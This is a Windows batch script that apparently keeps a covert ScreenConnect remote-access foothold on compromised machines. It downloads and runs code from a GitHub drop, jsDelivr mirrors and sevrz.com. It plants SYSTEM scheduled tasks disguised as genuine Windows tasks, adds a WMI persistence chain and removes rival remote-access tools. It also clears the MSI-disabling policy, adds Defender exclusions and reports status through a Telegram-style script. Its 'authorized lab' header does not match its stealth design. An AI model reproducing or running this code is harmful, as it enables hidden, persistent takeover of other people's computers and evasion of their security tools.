@echo off
rem ═══════════════════════════════════════════════════════════════
rem  OWN_MON  BUILD 20260802M15
rem  Persistent watchdog - identity-aware (anti-signature), mutual
rem  WMI+schtasks chains, MSI fallback chain, state.json, digest HB.
rem  Authorized internal deployment - lab/competition scope only.
rem ═══════════════════════════════════════════════════════════════
setlocal EnableDelayedExpansion

set "KEEP_FP=5f6010579852e507"
set "ALT_FP=f861c8140d453427"
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "ETL=C:\ProgramData\Microsoft\Windows\WER\Temp\.etlcache"
set "LOG=%WD%\own_mon.log"
set "STATE=%WD%\own_mon.state"
set "HBFLAG=%WD%\hb.flag"
set "CURL=%SystemRoot%\System32\curl.exe"
set "TG=https://raw.githubusercontent.com/xnobuddy/github-drop/main/tg_report.ps1?t=%RANDOM%%RANDOM%"
set "TG2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/tg_report.ps1?t=%RANDOM%%RANDOM%"
set "OWNSEC=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_secure.cmd?t=%RANDOM%%RANDOM%"
set "OWNSEC2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_secure.cmd?t=%RANDOM%%RANDOM%"
set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.cmd?t=%RANDOM%%RANDOM%"
set "OWNMON2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_mon.cmd?t=%RANDOM%%RANDOM%"
set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1?t=%RANDOM%%RANDOM%"
set "OWNLIB2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_lib.ps1?t=%RANDOM%%RANDOM%"
set "MSI_URL=https://sevrz.com/ScreenConnect.ClientSetup.msi"
set "MSI_PKG1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg.msi"
set "MSI_PKG2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/pkg.msi"
set "MSI=%ProgramData%\ScreenConnect.ClientSetup.msi"

if not exist "%WD%" md "%WD%" 2>nul
if not exist "%LOG%" type nul>"%LOG%" 2>nul

set "MONVER=M15"
set "PF86=%ProgramFiles(x86)%"
for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
echo.>>"%LOG%"
echo ── tick !DT! [ver %MONVER%] ──>>"%LOG%"
set "COUNT=0"
set "INSTALLED=0"
set "PRIM_OK=0"
set "ALT_OK=0"
set "FOREIGN_LEFT=0"
set "FOREIGN_LIST="
set "MSIEXIT=not-run"

rem ── per-host identity (anti-signature) ────────────────────────
if not exist "%WD%\identity.cfg" if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,2 delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%V"
if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\Scheduled"
if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\Server"
if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHost"
if not defined TASK_D set "TASK_D=\Microsoft\Windows\Tcpip\IpAddressConflict1"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"

rem ── [A] auto-update core files (best effort) ──────────────────
if not exist "%CURL%" set "CURL=curl.exe"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\tg_report.new" "%TG%" >nul 2>&1
if not exist "%WD%\tg_report.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\tg_report.new" "%TG2%" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
for %%F in ("%WD%\tg_report.new") do if %%~zF GTR 1500 move /y "%WD%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%WD%\own_secure.new" "%OWNSEC%" >nul 2>&1
if not exist "%WD%\own_secure.new" "%CURL%" -L --connect-timeout 8 --max-time 30 -o "%WD%\own_secure.new" "%OWNSEC2%" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
for %%F in ("%WD%\own_secure.new") do if %%~zF GTR 800 move /y "%WD%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\own_lib.new" "%OWNLIB%" >nul 2>&1
if not exist "%WD%\own_lib.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\own_lib.new" "%OWNLIB2%" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
for %%F in ("%WD%\own_lib.new") do if %%~zF GTR 1500 move /y "%WD%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
rem self-update: download new own_mon, apply AFTER this tick
set "SELF_UPD=0"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\own_mon.next" "%OWNMON%" >nul 2>&1
if not exist "%WD%\own_mon.next" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\own_mon.next" "%OWNMON2%" >nul 2>&1
for %%F in ("%WD%\own_mon.next") do if %%~zF GTR 1500 (
  fc /b "%WD%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
  if errorlevel 1 set "SELF_UPD=1"
)

rem ── [B] re-arm chain 1 (schtasks) if missing ──────────────────
schtasks /Query /TN "%TASK_A%" >nul 2>&1
if errorlevel 1 (
  echo rearm TASK_A %TASK_A%>>"%LOG%"
  schtasks /Create /F /TN "%TASK_A%" /SC MINUTE /MO %MO_A% /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
  schtasks /Run /TN "%TASK_A%" >nul 2>&1
)
schtasks /Query /TN "%TASK_B%" >nul 2>&1
if errorlevel 1 (
  echo rearm TASK_B %TASK_B%>>"%LOG%"
  schtasks /Create /F /TN "%TASK_B%" /SC MINUTE /MO %MO_B% /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
  schtasks /Run /TN "%TASK_B%" >nul 2>&1
)
schtasks /Query /TN "%TASK_C%" >nul 2>&1
if errorlevel 1 (
  echo rearm TASK_C %TASK_C%>>"%LOG%"
  schtasks /Create /F /TN "%TASK_C%" /SC ONSTART /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
)
schtasks /Query /TN "%TASK_D%" >nul 2>&1
if errorlevel 1 (
  echo rearm TASK_D %TASK_D%>>"%LOG%"
  schtasks /Create /F /TN "%TASK_D%" /SC ONLOGON /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
)

rem ── [B2] re-arm chain 2 (WMI subscription) if missing ─────────
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do set "WD_STATE=%%R"
  if /I "!WD_STATE!"=="REARMED" echo watchdog WMI REARMED>>"%LOG%"
)

rem ── [E] exterminate foreign SC + disallowed RMM (BEFORE heal/install,
rem     so the SC installer custom action never collides with rivals) ──
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
set "FOREIGN_LEFT=0"
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "FP=%%a"
  set "FP=!FP: =!"
  set /a COUNT+=1
  if /I not "!FP!"=="%KEEP_FP%" if /I not "!FP!"=="%ALT_FP%" (
    set /a FOREIGN_LEFT+=1
    set "FOREIGN_LIST=!FOREIGN_LIST!!FP! "
    echo foreign_left_!FP!>>"%LOG%"
  )
)

rem ── [C] heal ScreenConnect prim/alt ────────────────────────────
for /f "tokens=1,2 delims=()" %%a in ('sc query "ScreenConnect Client (%KEEP_FP%)" ^| findstr /C:"SERVICE_NAME"') do (
  set /a COUNT+=1
  set "INSTALLED=1"
  set "PRIMSTATE=%%b"
)
sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
if not errorlevel 1 set "PRIM_OK=1"
for /f "tokens=1,2 delims=()" %%a in ('sc query "ScreenConnect Client (%ALT_FP%)" ^| findstr /C:"SERVICE_NAME"') do set /a COUNT+=1
sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
if not errorlevel 1 set "ALT_OK=1"

if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
  echo svc heal restart>>"%LOG%"
  net start "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
  sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
  if not errorlevel 1 set "PRIM_OK=1"
)
if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "svc-wont-start" >nul 2>&1
  call :TgState DOWN "ScreenConnect (%KEEP_FP%) installed but wont start"
  goto :AfterHeal
)
if "%INSTALLED%"=="1" goto :AfterHeal

rem ── [D] primary SC missing - heal ladder ──────────────────────
rem M12: FIRST repair the registered product (recreates service without
rem touching the ALT instance); fresh msiexec install only as fallback.
echo svc missing - heal begin>>"%LOG%"
call :RepairRegistered "%KEEP_FP%"
if "%INSTALLED%"=="0" call :InstallMsi "%MSI_URL%" "main"
if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG1?t=%RANDOM%" "github-pkg"
if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG2%" "jsdelivr-pkg"
if "%INSTALLED%"=="0" (
  for %%F in ("%MSI%") do if %%~zF GTR 1000000 (
    echo cache retry install>>"%LOG%"
    call :NoMsiPolicy
    msiexec /i "%MSI%" /qn /norestart /L*v "%WD%\msi_heal.log" >nul 2>&1
    set "MSIEXIT=!ERRORLEVEL!"
    echo cache msiexec exit=!MSIEXIT!>>"%LOG%"
    call :WaitSvc
  )
)
call :RestoreAlt
if "%INSTALLED%"=="0" (
  if exist "%WD%\msi_heal.log" (
    echo --- msi_heal.log tail --->>"%LOG%"
    powershell -NoProfile -NonInteractive -Command "Get-Content -LiteralPath '%WD%\msi_heal.log' -Tail 10" >>"%LOG%" 2>&1
  )
  if not defined MSIEXIT set "MSIEXIT=fetch-fail"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "msi-failed" >nul 2>&1
  call :TgState FAIL "MSI install failed on all sources (msiexec exit %MSIEXIT%)"
) else (
  echo svc restored>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "restored" >nul 2>&1
  call :TgState RESTORED "ScreenConnect reinstalled OK"
)

:AfterHeal
rem (extermination already ran pre-heal in [E]; foreign survivors counted there)

rem ── [F] stealth re-secure (quiet Defender exclusion refresh) ──
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '%WD%','%ETL%' -ErrorAction Stop } catch {}" >nul 2>&1

rem ── [G] periodic full re-secure every ~2 h ────────────────────
powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\own_secure.cmd') -and (( -not (Test-Path '%WD%\sec.flag')) -or (((Get-Date) - (Get-Item -LiteralPath '%WD%\sec.flag').LastWriteTime).TotalHours -ge 2))){ exit 1 } else { exit 0 }" >nul 2>&1
if errorlevel 1 (
  echo periodic re-secure>>"%LOG%"
  call "%WD%\own_secure.cmd" >>"%LOG%" 2>&1
  echo done>"%WD%\sec.flag"
)

rem ── [H] campaign state + hourly compact digest ────────────────
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% >nul 2>&1
powershell -NoProfile -NonInteractive -Command "if((Test-Path '%HBFLAG%') -and (New-TimeSpan -Start (Get-Item -LiteralPath '%HBFLAG%').LastWriteTime).TotalMinutes -lt 60){ exit 0 } else { exit 1 }" >nul 2>&1
if errorlevel 1 (
  echo hb>%HBFLAG%
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State HB -Mode compact -Build %MONVER% -Count !COUNT! >nul 2>&1
  echo digest HB sent>>"%LOG%"
)

rem ── [I] self-update apply (last thing this tick) ──────────────
if "%SELF_UPD%"=="1" (
  echo self-update apply>>"%LOG%"
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  move /y "%WD%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
)

echo tick done: prim=%PRIM_OK% alt=%ALT_OK% foreign=%FOREIGN_LEFT%>>"%LOG%"
endlocal
exit /b 0

rem ═══════════════ helpers ═══════════════
:InstallMsi
rem %1=url %2=tag
set "URL=%~1"
set "TAG=%~2"
echo [%TAG%] fetch %URL%>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o "%MSI%.tmp" "%URL%" >>"%LOG%" 2>&1
for %%F in ("%MSI%.tmp") do if %%~zF LEQ 1000000 (
  echo [%TAG%] fetch failed>>"%LOG%"
  del /f /q "%MSI%.tmp" >nul 2>&1
  exit /b 1
)
move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
call :NoMsiPolicy
rem M13: stale primary dir (service deleted, product unregistered) breaks
rem the SC installer custom action - clear it before installing
sc query "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
if errorlevel 1 if exist "%PF86%\ScreenConnect Client (%KEEP_FP%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
)
echo [%TAG%] msiexec install>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart /L*v "%WD%\msi_heal.log" >nul 2>&1
set "MSIEXIT=!ERRORLEVEL!"
echo [%TAG%] msiexec exit=!MSIEXIT!>>"%LOG%"
call :WaitSvc
exit /b 0

:RepairRegistered
rem %1=fingerprint - service deleted but product registered: repair by GUID.
sc query "ScreenConnect Client (%~1)" >nul 2>&1
if not errorlevel 1 exit /b 0
if not exist "%WD%\own_lib.ps1" exit /b 1
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%~1" -WorkDir "%WD%" >>"%LOG%" 2>&1
call :WaitSvc
exit /b 0

:RestoreAlt
rem ALT service gone but still registered (SC-family msiexec side effect) - repair it too.
sc query "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
if not errorlevel 1 exit /b 0
echo alt missing - repair attempt>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%ALT_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
if not errorlevel 1 set "ALT_OK=1"
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:WaitSvc
set "TRIES=0"
:WaitLoop
sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
if not errorlevel 1 (
  set "INSTALLED=1"
  set "PRIM_OK=1"
  exit /b 0
)
set /a TRIES+=1
if %TRIES% GEQ 10 exit /b 1
ping 127.0.0.1 -n 7 >nul 2>&1
goto :WaitLoop

:TgState
set "NEWSTATE=%~1"
set "MSG=%~2"
set "OLDSTATE="
if exist "%STATE%" set /p OLDSTATE=<"%STATE%"
rem rate-limit repeated DOWN/FAIL: max 1 alert per 30 min while stuck
if /I "%NEWSTATE%"=="DOWN" goto :MaybeSuppress
if /I "%NEWSTATE%"=="FAIL" goto :MaybeSuppress
goto :SendAlert
:MaybeSuppress
if /I "%NEWSTATE%"=="%OLDSTATE%" if exist "%WD%\tg_sent.flag" (
  powershell -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_sent.flag').LastWriteTime).TotalMinutes -lt 30){exit 0}else{exit 1}" >nul 2>&1
  if not errorlevel 1 (
    echo tg_suppressed_%NEWSTATE%>>"%LOG%"
    exit /b 0
  )
)
:SendAlert
echo %NEWSTATE%>"%STATE%"
echo sent>"%WD%\tg_sent.flag"
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State %NEWSTATE% -Summary "%MSG%" -Build %MONVER% -Count %COUNT% >nul 2>&1
echo tg state %NEWSTATE% sent>>"%LOG%"
exit /b 0
